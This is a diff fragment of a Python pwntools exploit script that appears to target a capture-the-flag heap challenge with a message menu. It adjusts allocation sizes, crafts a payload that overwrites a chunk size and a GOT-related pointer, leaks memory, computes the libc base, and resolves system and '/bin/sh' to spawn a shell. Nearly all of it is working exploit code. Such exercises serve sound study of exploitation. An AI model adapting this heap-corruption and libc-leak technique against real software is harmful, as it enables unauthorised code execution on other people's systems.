@@ -34,11 +34,10 @@ addr_arrList = 0x603340
 addr_c1 = 0x7ffff7ed8000
 addr_c2 = 0x7ffff7ed8800
 addr_c3 = 0x7ffff7ed9008
-
 addr_cc1 = 0x7ffff7eda018
 
-fn_addMsg(0x20, "A")
-fn_addMsg(0x20, "B")
+fn_addMsg(0x400, "A")
+fn_addMsg(0x400, "B")
 payload = "C" * 8
 payload += p64(0x30)
 payload += p64(got_libc)
@@ -50,20 +49,11 @@ fn_leak(addr_c1, 0x80)
 fn_leak(addr_c2, 0x80)
 fn_leak(addr_c3, 0x80)
 
-exit()
-
 p.sendline("2")
 data = p.recvuntil("Which Message You Want To Delete?\n")
-'''
-data = p.recv()
-for i in xrange(0x719):
-	data += p.recv()
-'''
-
 data = u64(data.split("1. ")[1][:6].ljust(8, "\x00"))
 
 libc_base = data - 0x20740
-one_shot = libc_base + 0x4526a
 addr_system = libc_base + 0x45390
 binsh = libc_base + 0x18cd17
 
